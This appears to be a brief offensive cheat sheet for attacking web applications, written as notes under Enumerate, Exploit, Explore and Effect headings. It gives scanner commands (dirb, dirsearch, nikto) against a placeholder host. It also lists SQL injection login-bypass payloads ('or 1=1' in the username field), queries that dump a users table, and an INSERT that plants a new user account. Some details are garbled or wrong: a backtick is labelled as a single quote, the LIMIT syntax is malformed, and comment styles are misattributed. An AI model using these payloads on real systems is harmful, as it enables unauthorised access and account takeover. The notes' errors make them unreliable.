## Enumerate
```bash
dirb evil.com -r -z10 # recursive; wait 10 milliseconds between delays

python3 dirsearch/dirsearch.py -u evil.com --simple-report demo-webcrawl.txt

nikto -h evil.com -Format txt -o demo-vulnscan-web.txt
```

SQL Injection Vulnerabilities
```bash
` # single-quote
# the resulting error may indicate the underlying web server software, database software, and server OS. 
```

## Exploit
Comments
```
# MySQL, MariaDB
-- Oracle
/* Oracle
*/ Oracle
```

SQL Injection Examples
```
# bypass auth (put in the username field)
victor' or 1=1; -- 

# bypass auth (put in the username field; the LIMIT keyword might be necessary for some databases)
victor' or 1=1 LIMIT=1; -- 
```

SQL Database Query Examples
```sql
USE victimdb;
SELECT * FROM users;
```

## Explore
```sql
SELECT * FROM target.users # database.table
```

## Effect
Add a new user to a SQL database
```sql
INSERT INTO target.users(username, password) VALUES ('victor','please');
```
